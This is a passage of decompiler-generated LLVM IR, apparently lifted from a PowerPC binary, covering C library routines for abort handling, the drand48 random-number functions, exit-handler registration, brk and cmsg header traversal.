  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10014af4.564 to i32), i32* @lr, align 4
  %v1_10014af0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002ef08.563 to i32))
  %v2_10014af8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10014af8, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_10014b1033 = add i32 %v2_10014af8, 124
  %v4_10014b1034 = inttoptr i32 %v3_10014b1033 to i32*
  store i32 0, i32* %v4_10014b1034, align 4
  %v0_10014b1435 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014b1436 = add i32 %v0_10014b1435, -1
  store i32 %v1_10014b1436, i32* %r9.global-to-local, align 4
  %v0_10014b1837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014b1838 = add i32 %v0_10014b1837, -1
  store i32 %v1_10014b1838, i32* %ctr.global-to-local, align 4
  %v2_10014b1839 = icmp eq i32 %v1_10014b1838, 0
  br i1 %v2_10014b1839, label %dec_label_pc_10014b1c, label %dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge

dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge: ; preds = %dec_label_pc_10014b0c.lr.ph, %dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge
  %v1_10014b1440 = phi i32 [ %v1_10014b14, %dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge ], [ %v1_10014b1436, %dec_label_pc_10014b0c.lr.ph ]
  %v0_10014b10.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10014b10.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10014b0c = mul i32 %v1_10014b1440, 4
  %v3_10014b10 = add i32 %v1_10014b0c, %v1_10014b10.pre
  %v4_10014b10 = inttoptr i32 %v3_10014b10 to i32*
  store i32 %v0_10014b10.pre, i32* %v4_10014b10, align 4
  %v0_10014b14 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014b14 = add i32 %v0_10014b14, -1
  store i32 %v1_10014b14, i32* %r9.global-to-local, align 4
  %v0_10014b18 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014b18 = add i32 %v0_10014b18, -1
  store i32 %v1_10014b18, i32* %ctr.global-to-local, align 4
  %v2_10014b18 = icmp eq i32 %v1_10014b18, 0
  br i1 %v2_10014b18, label %dec_label_pc_10014b1c, label %dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge

dec_label_pc_10014b1c:                            ; preds = %dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge, %dec_label_pc_10014b0c.lr.ph
  store i32 %v2_10014af8, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10014b24 = call i32 @__sigaddset()
  %v3_10014b28 = icmp eq i32 %v0_10014b24, 0
  br i1 %v3_10014b28, label %dec_label_pc_10014b30, label %dec_label_pc_10014b40

dec_label_pc_10014b30:                            ; preds = %dec_label_pc_10014b1c
  store i32 268520256, i32* @lr, align 4
  %v3_10014b3c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10014af8, i32 0)
  br label %dec_label_pc_10014b40

dec_label_pc_10014b40:                            ; preds = %dec_label_pc_10014b1c, %dec_label_pc_10014b30
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10014b44 = load i32, i32* @global_var_1002f0a8.565, align 4
  %v3_10014b48 = icmp eq i32 %v3_10014b44, 0
  br i1 %v3_10014b48, label %dec_label_pc_10014b50, label %dec_label_pc_10014b78

dec_label_pc_10014b50:                            ; preds = %dec_label_pc_10014b40
  store i32 1, i32* @global_var_1002f0a8.565, align 4
  br label %dec_label_pc_10014b58

dec_label_pc_10014b58:                            ; preds = %dec_label_pc_10014bd4, %dec_label_pc_10014b50
  store i32 ptrtoint (i32* @global_var_1002ef08.563 to i32), i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002ef08.563 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014b68.566 to i32), i32* @lr, align 4
  %v0_10014b64 = call i32 @pthread_mutex_unlock()
  store i32 268520304, i32* @lr, align 4
  %v1_10014b6c = call i32 @__GI_raise(i32 6)
  %v0_10014b70 = load i32, i32* @r29, align 4
  store i32 268520312, i32* @lr, align 4
  %v1_10014b74 = call i32 @pthread_mutex_lock(i32 %v0_10014b70)
  %v3_10014b7c.pre = load i32, i32* @global_var_1002f0a8.565, align 4
  br label %dec_label_pc_10014b78

dec_label_pc_10014b78:                            ; preds = %dec_label_pc_10014b40, %dec_label_pc_10014b58
  %v0_10014bf0 = phi i32 [ %v3_10014b44, %dec_label_pc_10014b40 ], [ %v3_10014b7c.pre, %dec_label_pc_10014b58 ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10014b80 = icmp eq i32 %v0_10014bf0, 1
  br i1 %v3_10014b80, label %dec_label_pc_10014bc0.lr.ph, label %dec_label_pc_10014bf0

dec_label_pc_10014bc0.lr.ph:                      ; preds = %dec_label_pc_10014b78
  %v2_10014b8c = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002f0a8.565, align 4
  store i32 ptrtoint (i32* @global_var_10014ba0.567 to i32), i32* @lr, align 4
  %v3_10014b9c = call i32 @__GI_memset(i32 %v2_10014b8c, i32 0, i32 140)
  store i32 %v2_10014af8, i32* @r8, align 4
  store i32 -1, i32* @r10, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_10014b1033, i32* %r9.global-to-local, align 4
  %v2_10014bc825 = add i32 %v2_10014af8, 256
  %v3_10014bc826 = inttoptr i32 %v2_10014bc825 to i32*
  store i32 -1, i32* %v3_10014bc826, align 4
  %v0_10014bcc27 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014bcc28 = add i32 %v0_10014bcc27, -1
  store i32 %v1_10014bcc28, i32* @r11, align 4
  %v0_10014bd029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014bd030 = add i32 %v0_10014bd029, -1
  store i32 %v1_10014bd030, i32* %ctr.global-to-local, align 4
  %v2_10014bd031 = icmp eq i32 %v1_10014bd030, 0
  br i1 %v2_10014bd031, label %dec_label_pc_10014bd4, label %dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge

dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge: ; preds = %dec_label_pc_10014bc0.lr.ph, %dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge
  %v1_10014bcc32 = phi i32 [ %v1_10014bcc, %dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge ], [ %v1_10014bcc28, %dec_label_pc_10014bc0.lr.ph ]
  %v1_10014bc4.pre = load i32, i32* @r8, align 4
  %v0_10014bc8.pre = load i32, i32* @r10, align 4
  %v1_10014bc0 = mul i32 %v1_10014bcc32, 4
  %v2_10014bc4 = add i32 %v1_10014bc0, %v1_10014bc4.pre
  store i32 %v2_10014bc4, i32* %r9.global-to-local, align 4
  %v2_10014bc8 = add i32 %v2_10014bc4, 132
  %v3_10014bc8 = inttoptr i32 %v2_10014bc8 to i32*
  store i32 %v0_10014bc8.pre, i32* %v3_10014bc8, align 4
  %v0_10014bcc = load i32, i32* @r11, align 4
  %v1_10014bcc = add i32 %v0_10014bcc, -1
  store i32 %v1_10014bcc, i32* @r11, align 4
  %v0_10014bd0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014bd0 = add i32 %v0_10014bd0, -1
  store i32 %v1_10014bd0, i32* %ctr.global-to-local, align 4
  %v2_10014bd0 = icmp eq i32 %v1_10014bd0, 0
  br i1 %v2_10014bd0, label %dec_label_pc_10014bd4, label %dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge

dec_label_pc_10014bd4:                            ; preds = %dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge, %dec_label_pc_10014bc0.lr.ph
  store i32 268520428, i32* @lr, align 4
  %v4_10014be8 = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10014b58

dec_label_pc_10014bf0:                            ; preds = %dec_label_pc_10014b78
  %v3_10014bf0 = icmp eq i32 %v0_10014bf0, 2
  br i1 %v3_10014bf0, label %dec_label_pc_10014bf8, label %dec_label_pc_10014c04

dec_label_pc_10014bf8:                            ; preds = %dec_label_pc_10014bf0
  store i32 3, i32* @global_var_1002f0a8.565, align 4
  br label %dec_label_pc_10014c04

dec_label_pc_10014c04:                            ; preds = %dec_label_pc_10014bf0, %dec_label_pc_10014bf8
  %v3_10014c04 = phi i32 [ %v0_10014bf0, %dec_label_pc_10014bf0 ], [ 3, %dec_label_pc_10014bf8 ]
  %v1_10014c0c = icmp ne i32 %v3_10014c04, 3
  call void @__pseudo_cond_branch(i1 %v1_10014c0c, i32 268520480)
  store i32 4, i32* @global_var_1002f0a8.565, align 4
  %v1_10014c1c = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10014c1c

; uselistorder directives
  uselistorder i32 %v1_10014bd0, { 1, 0 }
  uselistorder i32 %v1_10014bcc, { 1, 0 }
  uselistorder i32 %v1_10014b18, { 1, 0 }
  uselistorder i32 %v1_10014b14, { 1, 0 }
  uselistorder i32 %v2_10014af8, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 6, 3, 7, 5, 4, 2, 0, 1 }
  uselistorder i32* %ctr.global-to-local, { 9, 8, 4, 0, 1, 7, 6, 5, 2, 3 }
  uselistorder i32 (i32)* @__GI__exit, { 2, 1, 6, 3, 8, 5, 4, 0, 7 }
  uselistorder i32 127, { 1, 5, 0, 2, 4, 6, 3 }
  uselistorder i32 (i32, i32*, i32)* @__GI_sigaction, { 3, 0, 2, 1 }
  uselistorder i32 132, { 4, 0, 1, 2, 3 }
  uselistorder i32* @r11, { 36, 37, 3, 31, 32, 5, 33, 34, 24, 25, 26, 27, 44, 45, 46, 39, 40, 0, 51, 38, 28, 6, 56, 57, 58, 59, 60, 61, 62, 63, 52, 53, 54, 10, 11, 48, 7, 49, 50, 12, 20, 21, 55, 13, 14, 16, 17, 18, 19, 15, 35, 43, 1, 4, 2, 42, 22, 41, 8, 47, 9, 23, 29, 30 }
  uselistorder i32 ()* @pthread_mutex_unlock, { 9, 11, 10, 2, 1, 0, 8, 7, 6, 20, 19, 18, 17, 21, 5, 4, 22, 3, 16, 15, 14, 13, 12 }
  uselistorder i32* @global_var_1002f0a8.565, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 1, 6, 5, 4, 3, 9, 2, 14, 13, 15, 12, 11, 10, 0, 8, 7 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ef08.563 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014c04, { 1, 0 }
  uselistorder label %dec_label_pc_10014bc0.dec_label_pc_10014bc0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10014b78, { 1, 0 }
  uselistorder label %dec_label_pc_10014b40, { 1, 0 }
  uselistorder label %dec_label_pc_10014b0c.dec_label_pc_10014b0c_crit_edge, { 1, 0 }
}

define i32 @lrand48_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r4, align 4
  %v2_10014c30 = inttoptr i32 %arg2 to i32*
  %v3_10014c30 = call i32 @nrand48_r(i32 %arg1, i32* %v2_10014c30)
  ret i32 %v3_10014c30
}

define i32 @nrand48_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r3, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* @r31, align 4
  %v0_10014c4c = call i32 @__drand48_iterate()
  %v1_10014c50 = icmp slt i32 %v0_10014c4c, 0
  store i32 -1, i32* %r3.global-to-local, align 4
  br i1 %v1_10014c50, label %dec_label_pc_10014c78, label %dec_label_pc_10014c5c

dec_label_pc_10014c5c:                            ; preds = %entry
  %v0_10014c5c = load i32, i32* @r31, align 4
  %v1_10014c5c = add i32 %v0_10014c5c, 2
  %v2_10014c5c = inttoptr i32 %v1_10014c5c to i16*
  %v3_10014c5c = load i16, i16* %v2_10014c5c, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10014c64 = add i32 %v0_10014c5c, 4
  %v2_10014c64 = inttoptr i32 %v1_10014c64 to i16*
  %v3_10014c64 = load i16, i16* %v2_10014c64, align 2
  %v4_10014c64 = zext i16 %v3_10014c64 to i32
  %div = udiv i16 %v3_10014c5c, 2
  %v1_10014c68 = zext i16 %div to i32
  %v1_10014c6c = mul nuw i32 %v4_10014c64, 32768
  %v2_10014c70 = or i32 %v1_10014c6c, %v1_10014c68
  %v1_10014c74 = load i32, i32* %r30.global-to-local, align 4
  %v2_10014c74 = inttoptr i32 %v1_10014c74 to i32*
  store i32 %v2_10014c70, i32* %v2_10014c74, align 4
  %v0_10014c88.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014c78

dec_label_pc_10014c78:                            ; preds = %entry, %dec_label_pc_10014c5c
  %v0_10014c88 = phi i32 [ -1, %entry ], [ %v0_10014c88.pre, %dec_label_pc_10014c5c ]
  ret i32 %v0_10014c88

; uselistorder directives
  uselistorder label %dec_label_pc_10014c78, { 1, 0 }
}

define i32 @__GI_srand48_r(i16 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i16*
  %tmp1 = sext i16 %arg1 to i32
  %v5_10014c90 = sdiv i32 %tmp1, 65536
  store i32 %v5_10014c90, i32* %r9.global-to-local, align 4
  %v4_10014c94 = add i32 %arg2, 14
  %v5_10014c94 = inttoptr i32 %v4_10014c94 to i16*
  store i16 1, i16* %v5_10014c94, align 2
  store i32 -554958848, i32* %r10.global-to-local, align 4
  store i32 13070, i32* %r0.global-to-local, align 4
  %v0_10014ca0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014ca0 = trunc i32 %v0_10014ca0 to i16
  %v4_10014ca0 = add i32 %arg2, 4
  %v5_10014ca0 = inttoptr i32 %v4_10014ca0 to i16*
  store i16 %v1_10014ca0, i16* %v5_10014ca0, align 2
  %v5_10014ca4 = add i32 %arg2, 2
  %v6_10014ca4 = inttoptr i32 %v5_10014ca4 to i16*
  store i16 %arg1, i16* %v6_10014ca4, align 2
  store i32 5, i32* %r9.global-to-local, align 4
  %v0_10014cac = load i32, i32* %r0.global-to-local, align 4
  %v1_10014cac = trunc i32 %v0_10014cac to i16
  store i16 %v1_10014cac, i16* %tmp, align 2
  %v0_10014cb0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014cb0 = or i32 %v0_10014cb0, 58989
  store i32 %v1_10014cb0, i32* %r10.global-to-local, align 4
  store i32 11, i32* %r0.global-to-local, align 4
  %v0_10014cbc = load i32, i32* %r9.global-to-local, align 4
  %v3_10014cbc = add i32 %arg2, 16
  %v4_10014cbc = inttoptr i32 %v3_10014cbc to i32*
  store i32 %v0_10014cbc, i32* %v4_10014cbc, align 4
  %v0_10014cc0 = load i32, i32* %r10.global-to-local, align 4
  %v3_10014cc0 = add i32 %arg2, 20
  %v4_10014cc0 = inttoptr i32 %v3_10014cc0 to i32*
  store i32 %v0_10014cc0, i32* %v4_10014cc0, align 4
  %v0_10014cc4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10014cc4 = trunc i32 %v0_10014cc4 to i16
  %v4_10014cc4 = add i32 %arg2, 12
  %v5_10014cc4 = inttoptr i32 %v4_10014cc4 to i16*
  store i16 %v1_10014cc4, i16* %v5_10014cc4, align 2
  ret i32 0
}

define i32 @__exit_handler(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r10, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_10014d484 = load i32, i32* @global_var_1002f0ac.569, align 4
  %v3_10014d4c7 = icmp eq i32 %v3_10014d484, 0
  %v1_10014d508 = add i32 %v3_10014d484, -1
  %v3_10014d5c10 = load i32, i32* @global_var_1002f0b0.568, align 4
  br i1 %v3_10014d4c7, label %dec_label_pc_10014d5c, label %dec_label_pc_10014ce4

dec_label_pc_10014ce4:                            ; preds = %entry, %dec_label_pc_10014d40.backedge
  %v3_10014d5c13 = phi i32 [ %v3_10014d5c, %dec_label_pc_10014d40.backedge ], [ %v3_10014d5c10, %entry ]
  %v1_10014d5011 = phi i32 [ %v1_10014d50, %dec_label_pc_10014d40.backedge ], [ %v1_10014d508, %entry ]
  %v1_10014d5412.in = phi i32 [ %v1_10014d50, %dec_label_pc_10014d40.backedge ], [ %v1_10014d508, %entry ]
  %v1_10014d5412 = mul i32 %v1_10014d5412.in, 16
  store i32 %v1_10014d5011, i32* @global_var_1002f0ac.569, align 4
  %v2_10014cec = add i32 %v3_10014d5c13, %v1_10014d5412
  %v3_10014cec = inttoptr i32 %v2_10014cec to i32*
  %v4_10014cec = load i32, i32* %v3_10014cec, align 4
  %v3_10014cf4 = icmp eq i32 %v4_10014cec, 2
  br i1 %v3_10014cf4, label %dec_label_pc_10014d08, label %dec_label_pc_10014d00

dec_label_pc_10014d00:                            ; preds = %dec_label_pc_10014ce4
  %v3_10014cf8 = icmp eq i32 %v4_10014cec, 3
  br i1 %v3_10014cf8, label %dec_label_pc_10014d28, label %dec_label_pc_10014d40.backedge

dec_label_pc_10014d08:                            ; preds = %dec_label_pc_10014ce4
  %v1_10014d08 = add i32 %v2_10014cec, 4
  %v2_10014d08 = inttoptr i32 %v1_10014d08 to i32*
  %v3_10014d08 = load i32, i32* %v2_10014d08, align 4
  %v3_10014d10 = icmp eq i32 %v3_10014d08, 0
  br i1 %v3_10014d10, label %dec_label_pc_10014d40.backedge, label %dec_label_pc_10014d18

dec_label_pc_10014d18:                            ; preds = %dec_label_pc_10014d08
  call void @__pseudo_call(i32 %v3_10014d08)
  br label %dec_label_pc_10014d40.backedge

dec_label_pc_10014d28:                            ; preds = %dec_label_pc_10014d00
  %v1_10014d28 = add i32 %v2_10014cec, 4
  %v2_10014d28 = inttoptr i32 %v1_10014d28 to i32*
  %v3_10014d28 = load i32, i32* %v2_10014d28, align 4
  %v3_10014d2c = icmp eq i32 %v3_10014d28, 0
  br i1 %v3_10014d2c, label %dec_label_pc_10014d40.backedge, label %dec_label_pc_10014d34

dec_label_pc_10014d34:                            ; preds = %dec_label_pc_10014d28
  call void @__pseudo_call(i32 %v3_10014d28)
  br label %dec_label_pc_10014d40.backedge

dec_label_pc_10014d40.backedge:                   ; preds = %dec_label_pc_10014d34, %dec_label_pc_10014d18, %dec_label_pc_10014d08, %dec_label_pc_10014d28, %dec_label_pc_10014d00
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r10, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_10014d48 = load i32, i32* @global_var_1002f0ac.569, align 4
  %v3_10014d4c = icmp eq i32 %v3_10014d48, 0
  %v1_10014d50 = add i32 %v3_10014d48, -1
  %v3_10014d5c = load i32, i32* @global_var_1002f0b0.568, align 4
  br i1 %v3_10014d4c, label %dec_label_pc_10014d5c, label %dec_label_pc_10014ce4

dec_label_pc_10014d5c:                            ; preds = %dec_label_pc_10014d40.backedge, %entry
  %v3_10014d5c.lcssa = phi i32 [ %v3_10014d5c10, %entry ], [ %v3_10014d5c, %dec_label_pc_10014d40.backedge ]
  store i32 %v3_10014d5c.lcssa, i32* @r3, align 4
  store i32 268520804, i32* @lr, align 4
  %v0_10014d60 = call i32 @free()
  ret i32 %v0_10014d60

; uselistorder directives
  uselistorder i32 %v1_10014d50, { 1, 0 }
  uselistorder i32 %v2_10014cec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10014d40.backedge, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10014ce4, { 1, 0 }
}

define i32 @__new_exitfn() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002eebc.448 to i32), i32* %r29.global-to-local, align 4
  %v2_10014d98 = ptrtoint i32* %stack_var_-40 to i32
  %v4_10014da0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002eebc.448 to i32))
  store i32 268520880, i32* @lr, align 4
  %v1_10014dac = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eebc.448 to i32))
  %v3_10014db4 = load i32, i32* @global_var_1002f0ac.569, align 4
  %v3_10014dbc = load i32, i32* @global_var_1002f0b4.571, align 4
  %v1_10014dc0 = add i32 %v3_10014db4, 1
  store i32 %v1_10014dc0, i32* @r9, align 4
  %v2_10014dc4 = icmp slt i32 %v3_10014dbc, %v1_10014dc0
  %v3_10014dd4 = load i32, i32* @global_var_1002f0b0.568, align 4
  br i1 %v2_10014dc4, label %dec_label_pc_10014dd4, label %dec_label_pc_10014e04

dec_label_pc_10014dd4:                            ; preds = %entry
  %v1_10014dc8 = mul i32 %v3_10014dbc, 16
  %v1_10014dcc = add i32 %v1_10014dc8, 320
  store i32 268520924, i32* @lr, align 4
  %v2_10014dd8 = call i32 @realloc(i32 %v3_10014dd4, i32 %v1_10014dcc)
  store i32 %v2_10014dd8, i32* %r29.global-to-local, align 4
  %v3_10014ddc = icmp eq i32 %v2_10014dd8, 0
  br i1 %v3_10014ddc, label %dec_label_pc_10014de4, label %dec_label_pc_10014df4

dec_label_pc_10014de4:                            ; preds = %dec_label_pc_10014dd4
  %v0_10014de4 = call i32 @__errno_location()
  %v2_10014dec = inttoptr i32 %v0_10014de4 to i32*
  store i32 12, i32* %v2_10014dec, align 4
  br label %dec_label_pc_10014e3c

dec_label_pc_10014df4:                            ; preds = %dec_label_pc_10014dd4
  %v3_10014df4 = load i32, i32* @global_var_1002f0b4.571, align 4
  store i32 %v2_10014dd8, i32* @global_var_1002f0b0.568, align 4
  %v1_10014dfc = add i32 %v3_10014df4, 20
  store i32 %v1_10014dfc, i32* @global_var_1002f0b4.571, align 4
  %v3_10014e0c.pre = load i32, i32* @global_var_1002f0ac.569, align 4
  br label %dec_label_pc_10014e04

dec_label_pc_10014e04:                            ; preds = %entry, %dec_label_pc_10014df4
  %v3_10014e14 = phi i32 [ %v2_10014dd8, %dec_label_pc_10014df4 ], [ %v3_10014dd4, %entry ]
  %v3_10014e0c = phi i32 [ %v3_10014e0c.pre, %dec_label_pc_10014df4 ], [ %v3_10014db4, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  store i32 %v3_10014e14, i32* %r7.global-to-local, align 4
  %v1_10014e1c = add i32 %v3_10014e0c, 1
  %v1_10014e24 = mul i32 %v3_10014e0c, 16
  store i32 %v1_10014e24, i32* @r10, align 4
  store i32 %v1_10014e1c, i32* @global_var_1002f0ac.569, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 19660), i32* @global_var_1002f064.449, align 4
  %v3_10014e34 = add i32 %v1_10014e24, %v3_10014e14
  %v4_10014e34 = inttoptr i32 %v3_10014e34 to i32*
  store i32 1, i32* %v4_10014e34, align 4
  %v0_10014e38 = load i32, i32* @r10, align 4
  %v1_10014e38 = load i32, i32* %r7.global-to-local, align 4
  %v2_10014e38 = add i32 %v1_10014e38, %v0_10014e38
  store i32 %v2_10014e38, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10014e3c

dec_label_pc_10014e3c:                            ; preds = %dec_label_pc_10014de4, %dec_label_pc_10014e04
  store i32 %v2_10014d98, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268521032, i32* @lr, align 4
  %v0_10014e44 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10014e4c = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10014e4c

; uselistorder directives
  uselistorder i32 %v1_10014e24, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 320, { 1, 0 }
  uselistorder i32* @global_var_1002f0b0.568, { 1, 2, 3, 0 }
  uselistorder i32* @global_var_1002f0ac.569, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002eebc.448 to i32), { 0, 2, 4, 1, 3 }
  uselistorder label %dec_label_pc_10014e3c, { 1, 0 }
  uselistorder label %dec_label_pc_10014e04, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10014e60 = add i32 %arg1, 28
  %v2_10014e60 = inttoptr i32 %v1_10014e60 to i32*
  %v3_10014e60 = load i32, i32* %v2_10014e60, align 4
  store i32 %v3_10014e60, i32* @global_var_1002f0b8.573, align 4
  %v1_10014e70 = add i32 %arg1, 44
  %v2_10014e70 = inttoptr i32 %v1_10014e70 to i32*
  %v3_10014e70 = load i32, i32* %v2_10014e70, align 4
  store i32 %v3_10014e70, i32* @global_var_1002f0bc.574, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002f0c0.478, align 4
  %v0_10014ea4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10014ea4)
  store i32 12, i32* @r3, align 4
  %v0_10014eac = call i32 @__syscall_error()
  ret i32 %v0_10014eac

; uselistorder directives
  uselistorder i32 ()* @__syscall_error, { 0, 1, 3, 2 }
  uselistorder i32* @global_var_1002f0c0.478, { 1, 0, 2 }
}

define i32 @__cmsg_nxthdr() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_10014eb0 = load i32, i32* @r4, align 4
  %v1_10014eb0 = inttoptr i32 %v0_10014eb0 to i32*
  %v2_10014eb0 = load i32, i32* %v1_10014eb0, align 4
  %v0_10014eb4 = load i32, i32* @r3, align 4
  store i32 %v0_10014eb4, i32* %r11.global-to-local, align 4
  %v1_10014eb8 = icmp ult i32 %v2_10014eb0, 11
  %v3_10014eb8 = icmp eq i32 %v2_10014eb0, 11
  store i1 %v1_10014eb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014eb8, i1* %cr7_eq.global-to-local, align 1
  %v1_10014ebc = add i32 %v2_10014eb0, 3
  store i32 %v1_10014ebc, i32* %r0.global-to-local, align 4
  %v1_10014ec0 = call i32 @__asm_rlwinm(i32 %v1_10014ebc, i32 0, i32 0, i32 29)
  %v0_10014ec4 = load i32, i32* @r4, align 4
  %v2_10014ec4 = add i32 %v0_10014ec4, %v1_10014ec0
  store i32 %v2_10014ec4, i32* %r3.global-to-local, align 4
  %v1_10014ec8 = add i32 %v2_10014ec4, 12
  %v0_10014ecc = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10014ecc = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10014ecc = or i1 %v0_10014ecc, %v1_10014ecc
  br i1 %v2_10014ecc, label %dec_label_pc_10014efc, label %dec_label_pc_10014ed0

dec_label_pc_10014ed0:                            ; preds = %entry
  %v0_10014ed0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014ed0 = add i32 %v0_10014ed0, 20
  %v2_10014ed0 = inttoptr i32 %v1_10014ed0 to i32*
  %v3_10014ed0 = load i32, i32* %v2_10014ed0, align 4
  store i32 %v3_10014ed0, i32* %r0.global-to-local, align 4
  %v1_10014ed4 = add i32 %v0_10014ed0, 16
  %v2_10014ed4 = inttoptr i32 %v1_10014ed4 to i32*
  %v3_10014ed4 = load i32, i32* %v2_10014ed4, align 4
  %v2_10014ed8 = add i32 %v3_10014ed4, %v3_10014ed0
  store i32 %v2_10014ed8, i32* %r0.global-to-local, align 4
  %v2_10014edc = icmp ult i32 %v1_10014ec8, %v2_10014ed8
  %v3_10014edc = icmp ugt i32 %v1_10014ec8, %v2_10014ed8
  %v4_10014edc = icmp eq i32 %v1_10014ec8, %v2_10014ed8
  store i1 %v2_10014edc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014edc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014edc, label %dec_label_pc_10014efc, label %dec_label_pc_10014ee4

dec_label_pc_10014ee4:                            ; preds = %dec_label_pc_10014ed0
  %v3_10014ee4 = inttoptr i32 %v2_10014ec4 to i32*
  %v4_10014ee4 = load i32, i32* %v3_10014ee4, align 4
  %v1_10014ee8 = add i32 %v4_10014ee4, 3
  %v1_10014eec = call i32 @__asm_rlwinm(i32 %v1_10014ee8, i32 0, i32 0, i32 29)
  %v0_10014ef0 = load i32, i32* %r3.global-to-local, align 4
  %v2_10014ef0 = add i32 %v0_10014ef0, %v1_10014eec
